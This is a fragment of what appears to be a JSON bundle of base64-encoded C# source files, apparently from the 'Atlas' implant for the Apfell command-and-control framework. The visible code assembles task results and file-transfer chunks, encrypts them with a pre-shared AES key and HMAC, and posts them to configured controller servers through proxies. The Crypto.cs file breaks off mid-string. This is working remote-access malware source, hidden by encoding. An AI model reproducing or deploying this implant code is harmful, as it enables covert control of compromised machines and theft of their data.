9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmdWxsX3BhdGggPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfbnVtID0gSm9iLmNodW5rX251bSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rX2RhdGEgPSBKb2IuY2h1bmtzWzBdLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9pZCA9IEpvYi5maWxlX2lkDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBvc3RSZXNwb25zZS5yZXNwb25zZXMuQWRkKFRhc2tSZXNwb25zZSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlRhc2tSZXNwb25zZSBUYXNrUmVzcG9uc2UgPSBuZXcgVXRpbHMuVGFza1Jlc3BvbnNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tfaWQgPSBKb2IudGFza19pZCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJfb3V0cHV0ID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXR1cyA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21wbGV0ZWQgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3IgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG90YWxfY2h1bmtzID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bGxfcGF0aCA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVua19udW0gPSBKb2IuY2h1bmtfbnVtLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfZGF0YSA9IEpvYi5jaHVua3NbMF0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX2lkID0gSm9iLmZpbGVfaWQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUG9zdFJlc3BvbnNlLnJlc3BvbnNlcy5BZGQoVGFza1Jlc3BvbnNlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIGlmICgoSm9iLnRvdGFsX2NodW5rcyAhPSAwKSAmJiAoIUpvYi51cGxvYWQpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChKb2IuY2h1bmtfbnVtICE9IEpvYi50b3RhbF9jaHVua3MpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBVdGlscy5UYXNrUmVzcG9uc2UgVGFza1Jlc3BvbnNlID0gbmV3IFV0aWxzLlRhc2tSZXNwb25zZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrX2lkID0gSm9iLnRhc2tfaWQsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2VyX291dHB1dCA9IEpvYi5jaHVua3NbMF0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21wbGV0ZWQgPSAiZmFsc2UiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3IgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG90YWxfY2h1bmtzID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bGxfcGF0aCA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVua19udW0gPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfZGF0YSA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX2lkID0gbnVsbA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQb3N0UmVzcG9uc2UucmVzcG9uc2VzLkFkZChUYXNrUmVzcG9uc2UpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBVdGlscy5UYXNrUmVzcG9uc2UgVGFza1Jlc3BvbnNlID0gbmV3IFV0aWxzLlRhc2tSZXNwb25zZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrX2lkID0gSm9iLnRhc2tfaWQsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2VyX291dHB1dCA9IEpvYi5jaHVua3NbMF0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21wbGV0ZWQgPSAidHJ1ZSIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlcnJvciA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b3RhbF9jaHVua3MgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZnVsbF9wYXRoID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rX251bSA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVua19kYXRhID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfaWQgPSBudWxsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBvc3RSZXNwb25zZS5yZXNwb25zZXMuQWRkKFRhc2tSZXNwb25zZSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlRhc2tSZXNwb25zZSBUYXNrUmVzcG9uc2UgPSBuZXcgVXRpbHMuVGFza1Jlc3BvbnNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrX2lkID0gSm9iLnRhc2tfaWQsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJfb3V0cHV0ID0gSm9iLnJlc3BvbnNlLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21wbGV0ZWQgPSAidHJ1ZSIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVycm9yID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG90YWxfY2h1bmtzID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZnVsbF9wYXRoID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfbnVtID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfZGF0YSA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfaWQgPSBudWxsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBQb3N0UmVzcG9uc2UucmVzcG9uc2VzLkFkZChUYXNrUmVzcG9uc2UpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHN0cmluZyBEYXRhID0gVXRpbHMuUG9zdFJlc3BvbnNlLlRvSnNvbihQb3N0UmVzcG9uc2UpOw0KICAgICAgICAgICAgICAgIGlmIChEYXRhLkNvbnRhaW5zKCJbXSIpKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgIH0NCiNpZiBERUZBVUxUDQogICAgICAgICAgICAgICAgc3RyaW5nIFNlcmlhbGl6ZWREYXRhID0gQ29udmVydC5Ub0Jhc2U2NFN0cmluZyhFbmNvZGluZy5VVEY4LkdldEJ5dGVzKENvbmZpZy5VVUlEICsgVXRpbHMuUG9zdFJlc3BvbnNlLlRvSnNvbihQb3N0UmVzcG9uc2UpKSk7DQojZWxpZiAoREVGQVVMVF9QU0sgfHwgREVGQVVMVF9FS0UpDQogICAgICAgICAgICAgICAgc3RyaW5nIFNlcmlhbGl6ZWREYXRhID0gQ3J5cHRvLkVuY3J5cHQoVXRpbHMuUG9zdFJlc3BvbnNlLlRvSnNvbihQb3N0UmVzcG9uc2UpKTsNCiNlbmRpZg0KICAgICAgICAgICAgICAgIHN0cmluZyByZXN1bHQgPSBQb3N0KFNlcmlhbGl6ZWREYXRhKTsNCiNpZiBERUZBVUxUDQogICAgICAgICAgICAgICAgc3RyaW5nIGZpbmFsX3Jlc3VsdCA9IEVuY29kaW5nLlVURjguR2V0U3RyaW5nKENvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhyZXN1bHQpKTsNCiNlbGlmIChERUZBVUxUX1BTSyB8fCBERUZBVUxUX0VLRSkNCiAgICAgICAgICAgICAgICBzdHJpbmcgZmluYWxfcmVzdWx0ID0gQ3J5cHRvLkRlY3J5cHQocmVzdWx0KTsNCiNlbmRpZg0KICAgICAgICAgICAgICAgIFV0aWxzLlBvc3RSZXNwb25zZVJlc3BvbnNlIFBvc3RSZXNwb25zZVJlc3BvbnNlID0gVXRpbHMuUG9zdFJlc3BvbnNlUmVzcG9uc2UuRnJvbUpzb24oZmluYWxfcmVzdWx0LlN1YnN0cmluZygzNikpOw0KICAgICAgICAgICAgICAgIGZvcmVhY2ggKFV0aWxzLlJlc3BvbnNlIFJlc3BvbnNlIGluIFBvc3RSZXNwb25zZVJlc3BvbnNlLnJlc3BvbnNlcykNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGZvcmVhY2ggKFV0aWxzLkpvYiBKb2IgaW4gSm9iTGlzdC5qb2JzKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLmNvbXBsZXRlZCkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLnRhc2tfaWQgPT0gUmVzcG9uc2UudGFza19pZCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChSZXNwb25zZS5zdGF0dXMgPT0gInN1Y2Nlc3MiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLmRvd25sb2FkKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChKb2IuZmlsZV9pZCA9PSBudWxsKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmZpbGVfaWQgPSBSZXNwb25zZS5maWxlX2lkOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLnRvdGFsX2NodW5rcyA9PSBKb2IuY2h1bmtfbnVtKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVXRpbHMuUmVtb3ZlSm9iKEpvYiwgSm9iTGlzdCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChKb2IuY2h1bmtzLkNvdW50ICE9IDApDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jb21wbGV0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNodW5rcy5SZW1vdmVBdCgwKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKChKb2IudG90YWxfY2h1bmtzICE9IDApICYgKCFKb2IudXBsb2FkKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLmNodW5rX251bSArIDEgIT0gSm9iLnRvdGFsX2NodW5rcykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jaHVua3MuUmVtb3ZlQXQoMCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jaHVua19udW0rKzsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVXRpbHMuUmVtb3ZlSm9iKEpvYiwgSm9iTGlzdCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlJlbW92ZUpvYihKb2IsIEpvYkxpc3QpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2gNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KI2lmIChERUZBVUxUIHx8IERFRkFVTFRfUFNLIHx8IERFRkFVTFRfRUtFKQ0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBHZXQoc3RyaW5nIEI2NERhdGEpDQogICAgICAgIHsNCiAgICAgICAgICAgIHN0cmluZyByZXN1bHQgPSBudWxsOw0KICAgICAgICAgICAgV2ViQ2xpZW50IGNsaWVudCA9IG5ldyBTeXN0ZW0uTmV0LldlYkNsaWVudCgpOw0KICAgICAgICAgICAgaWYgKENvbmZpZy5EZWZhdWx0UHJveHkpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgY2xpZW50LlByb3h5ID0gV2ViUmVxdWVzdC5EZWZhdWx0V2ViUHJveHk7DQogICAgICAgICAgICAgICAgY2xpZW50LlVzZURlZmF1bHRDcmVkZW50aWFscyA9IHRydWU7DQogICAgICAgICAgICAgICAgY2xpZW50LlByb3h5LkNyZWRlbnRpYWxzID0gQ3JlZGVudGlhbENhY2hlLkRlZmF1bHROZXR3b3JrQ3JlZGVudGlhbHM7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlIA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIFdlYlByb3h5IHByb3h5ID0gbmV3IFdlYlByb3h5DQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBBZGRyZXNzID0gbmV3IFVyaShDb25maWcuUHJveHlBZGRyZXNzKSwNCiAgICAgICAgICAgICAgICAgICAgVXNlRGVmYXVsdENyZWRlbnRpYWxzID0gZmFsc2UsDQogICAgICAgICAgICAgICAgICAgIENyZWRlbnRpYWxzID0gbmV3IE5ldHdvcmtDcmVkZW50aWFsKENvbmZpZy5Qcm94eVVzZXIsIENvbmZpZy5Qcm94eVBhc3N3b3JkKQ0KICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgY2xpZW50LlByb3h5ID0gcHJveHk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjbGllbnQuSGVhZGVycy5BZGQoIlVzZXItQWdlbnQiLCBDb25maWcuVXNlckFnZW50KTsNCiAgICAgICAgICAgIGNsaWVudC5RdWVyeVN0cmluZy5BZGQoQ29uZmlnLlBhcmFtLCBCNjREYXRhLlJlcGxhY2UoIisiLCAiJTJCIikuUmVwbGFjZSgiLyIsICIlMkYiKS5SZXBsYWNlKCI9IiwgIiUzRCIpLlJlcGxhY2UoIlxuIiwgIiUwQSIpKTsNCiAgICAgICAgICAgIENvbmZpZy5TZXJ2ZXJzID0gQ29uZmlnLlNlcnZlcnMuT3JkZXJCeShzPT5zLmNvdW50KS5Ub0xpc3QoKTsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJlc3VsdCA9IGNsaWVudC5Eb3dubG9hZFN0cmluZyhDb25maWcuU2VydmVyc1swXS5kb21haW4gKyBDb25maWcuVXJsKTsNCiAgICAgICAgICAgICAgICByZXR1cm4gcmVzdWx0Ow0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2gNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBDb25maWcuU2VydmVyc1swXS5jb3VudCsrOyANCiAgICAgICAgICAgICAgICByZXR1cm4gcmVzdWx0Ow0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgUG9zdChzdHJpbmcgQjY0RGF0YSkNCiAgICAgICAgew0KICAgICAgICAgICAgc3RyaW5nIHJlc3VsdCA9IG51bGw7DQogICAgICAgICAgICBXZWJDbGllbnQgY2xpZW50ID0gbmV3IFN5c3RlbS5OZXQuV2ViQ2xpZW50KCk7DQogICAgICAgICAgICBpZiAoQ29uZmlnLkRlZmF1bHRQcm94eSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBjbGllbnQuUHJveHkgPSBXZWJSZXF1ZXN0LkRlZmF1bHRXZWJQcm94eTsNCiAgICAgICAgICAgICAgICBjbGllbnQuVXNlRGVmYXVsdENyZWRlbnRpYWxzID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICBjbGllbnQuUHJveHkuQ3JlZGVudGlhbHMgPSBDcmVkZW50aWFsQ2FjaGUuRGVmYXVsdE5ldHdvcmtDcmVkZW50aWFsczsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBXZWJQcm94eSBwcm94eSA9IG5ldyBXZWJQcm94eQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgQWRkcmVzcyA9IG5ldyBVcmkoQ29uZmlnLlByb3h5QWRkcmVzcyksDQogICAgICAgICAgICAgICAgICAgIFVzZURlZmF1bHRDcmVkZW50aWFscyA9IGZhbHNlLA0KICAgICAgICAgICAgICAgICAgICBDcmVkZW50aWFscyA9IG5ldyBOZXR3b3JrQ3JlZGVudGlhbChDb25maWcuUHJveHlVc2VyLCBDb25maWcuUHJveHlQYXNzd29yZCkNCiAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgIGNsaWVudC5Qcm94eSA9IHByb3h5Ow0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2xpZW50LkhlYWRlcnMuQWRkKCJVc2VyLUFnZW50IiwgQ29uZmlnLlVzZXJBZ2VudCk7DQogICAgICAgICAgICBDb25maWcuU2VydmVycyA9IENvbmZpZy5TZXJ2ZXJzLk9yZGVyQnkocyA9PiBzLmNvdW50KS5Ub0xpc3QoKTsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJlc3VsdCA9IGNsaWVudC5VcGxvYWRTdHJpbmcoQ29uZmlnLlNlcnZlcnNbMF0uZG9tYWluICsgQ29uZmlnLlVybCwgQjY0RGF0YSk7DQogICAgICAgICAgICAgICAgcmV0dXJuIHJlc3VsdDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgQ29uZmlnLlNlcnZlcnNbMF0uY291bnQrKzsNCiAgICAgICAgICAgICAgICByZXR1cm4gcmVzdWx0Ow0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQojZW5kaWYNCiAgICB9DQp9DQo="
        },
        {
          "Crypto.cs": "77u\/dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLlRleHQ7DQp1c2luZyBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5Ow0KdXNpbmcgU3lzdGVtLklPOw0KdXNpbmcgU3lzdGVtLkxpbnE7DQoNCm5hbWVzcGFjZSBBdGxhcw0Kew0KICAgIGNsYXNzIENyeXB0bw0KICAgIHsNCiNpZiAoREVGQVVMVF9FS0UgfHwgSFRUUF9FS0UpDQogICAgICAgIC8vLyA8c3VtbWFyeT4NCiAgICAgICAgLy8vIEVuY3J5cHQgYW55IGdpdmVuIHBsYWludGV4dCB3aXRoIHRoZSBQU0sgZ2l2ZW4NCiAgICAgICAgLy8vIHRvIHRoZSBhZ2VudC4NCiAgICAgICAgLy8vIDwvc3VtbWFyeT4NCiAgICAgICAgLy8vIDxwYXJhbSBuYW1lPSJwbGFpbnRleHQiPlBsYWludGV4dCB0byBlbmNyeXB0LjwvcGFyYW0+DQogICAgICAgIC8vLyA8cmV0dXJucz5FbnJ5cHRlZCBzdHJpbmcuPC9yZXR1cm5zPg0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBFbmNyeXB0U3RhZ2Uoc3RyaW5nIHBsYWludGV4dCkNCiAgICAgICAgew0KICAgICAgICAgICAgdXNpbmcgKEFlcyBhZXMgPSBBZXMuQ3JlYXRlKCkpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgLy8gVXNlIG91ciBQU0sgKGdlbmVyYXRlZCBpbiBBcGZlbGwgcGF5bG9hZCBjb25maWcpIGFzIHRoZSBBRVMga2V5DQogICAgICAgICAgICAgICAgYWVzLktleSA9IENvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhDb25maWcuUHNrKTsNCiAgICAgICAgICAgICAgICBhZXMuUGFkZGluZyA9IFBhZGRpbmdNb2RlLlBLQ1M3Ow0KICAgICAgICAgICAgICAgIElDcnlwdG9UcmFuc2Zvcm0gZW5jcnlwdG9yID0gYWVzLkNyZWF0ZUVuY3J5cHRvcihhZXMuS2V5LCBhZXMuSVYpOw0KDQogICAgICAgICAgICAgICAgdXNpbmcgKE1lbW9yeVN0cmVhbSBlbmNyeXB0TWVtU3RyZWFtID0gbmV3IE1lbW9yeVN0cmVhbSgpKQ0KICAgICAgICAgICAgICAgIHVzaW5nIChDcnlwdG9TdHJlYW0gZW5jcnlwdENyeXB0b1N0cmVhbSA9IG5ldyBDcnlwdG9TdHJlYW0oZW5jcnlwdE1lbVN0cmVhbSwgZW5jcnlwdG9yLCBDcnlwdG9TdHJlYW1Nb2RlLldyaXRlKSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHVzaW5nIChTdHJlYW1Xcml0ZXIgZW5jcnlwdFN0cmVhbVdyaXRlciA9IG5ldyBTdHJlYW1Xcml0ZXIoZW5jcnlwdENyeXB0b1N0cmVhbSkpDQogICAgICAgICAgICAgICAgICAgICAgICBlbmNyeXB0U3RyZWFtV3JpdGVyLldyaXRlKHBsYWludGV4dCk7DQogICAgICAgICAgICAgICAgICAgIC8vIFdlIG5lZWQgdG8gc2VuZCB1dWlkOml2OmNpcGhlcnRleHQ6aG1hYw0KICAgICAgICAgICAgICAgICAgICAvLyBDb25jYXQgaXY6Y2lwaGVydGV4dA0KICAgICAgICAgICAgICAgICAgICBieXRlW10gZW5jcnlwdGVkID0gYWVzLklWLkNvbmNhdChlbmNyeXB0TWVtU3RyZWFtLlRvQXJyYXkoKSkuVG9BcnJheSgpOw0KICAgICAgICAgICAgICAgICAgICBITUFDU0hBMjU2IHNoYTI1NiA9IG5ldyBITUFDU0hBMjU2KENvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhDb25maWcuUHNrKSk7DQogICAgICAgICAgICAgICAgICAgIC8vIEF0dGFjaCBobWFjIHRvIGl2OmNpcGhlcnRleHQNCiAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIGhtYWMgPSBzaGEyNTYuQ29tcHV0ZUhhc2goZW5jcnlwdGVkKTsNCiAgICAgICAgICAgICAgICAgICAgLy8gQXR0YWNoIHV1aWQgdG8gaXY6Y2lwaGVydGV4dDpobWFjDQogICAgICAgICAgICAgICAgICAgIGJ5dGVbXSBmaW5hbCA9IEVuY29kaW5nLlVURjguR2V0Qnl0ZXMoQ29uZmlnLlBheWxvYWRVVUlEKS5Db25jYXQoZW5jcnlwdGVkLkNvbmNhdChobWFjKS5Ub0FycmF5KCkpLlRvQXJyYXkoKTsNCiAgICAgICAgICAgICAgICAgICAgLy8gUmV0dXJuIGJhc2U2NCBlbmNvZGVkIGNpcGhlcnRleHQNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIENvbnZlcnQuVG9CYXNlNjRTdHJpbmcoZmluYWwpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KI2VuZGlmIA0KI2lmIChERUZBVUxUX1BTSyB8fCBERUZBVUxUX0VLRSB8fCBIVFRQX1BTSyB8fCBIVFRQX0VLRSkNCiAgICAgICAgLy8vIDxzdW1tYXJ5Pg0KICAgICAgICAvLy8gRW5jcnlwdCBhbnkgZ2l2ZW4gcGxhaW50ZXh0IHdpdGggdGhlIFBTSyBnaXZlbg0KICAgICAgICAvLy8gdG8gdGhlIGFnZW50Lg0KICAgICAgICAvLy8gPC9zdW1tYXJ5Pg0KICAgICAgICAvLy8gPHBhcmFtIG5hbWU9InBsYWludGV4dCI+UGxhaW50ZXh0IHRvIGVuY3J5cHQuPC9wYXJhbT4NCiAgICAgICAgLy8vIDxyZXR1cm5zPkVucnlwdGVkIHN0cmluZy48L3JldHVybnM+DQogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEVuY3J5cHRDaGVja2luKHN0cmluZyBwbGFpbnRleHQpDQogICAgICAgIHsNCiAgICAgICAgICAgIHVzaW5nIChBZXMgYWVzID0gQWVzLkNyZWF0ZSgpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIC8vIFVzZSBvdXIgUFNLIChnZW5lcmF0ZWQgaW4gQXBmZWxsIHBheWxvYWQgY29uZmlnKSBhcyB0aGUgQUVTIGtleQ0KICAgICAgICAgICAgICAgIGFlcy5LZXkgPSBDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoQ29uZmlnLlBzayk7DQogICAgICAgICAgICAgICAgYWVzLlBhZGRpbmcgPSBQYWRkaW5nTW9kZS5QS0NTNzsNCiAgICAgICAgICAgICAgICBJQ3J5cHRvVHJhbnNmb3JtIGVuY3J5cHRvciA9IGFlcy5DcmVhdGVFbmNyeXB0b3IoYWVzLktleSwgYWVzL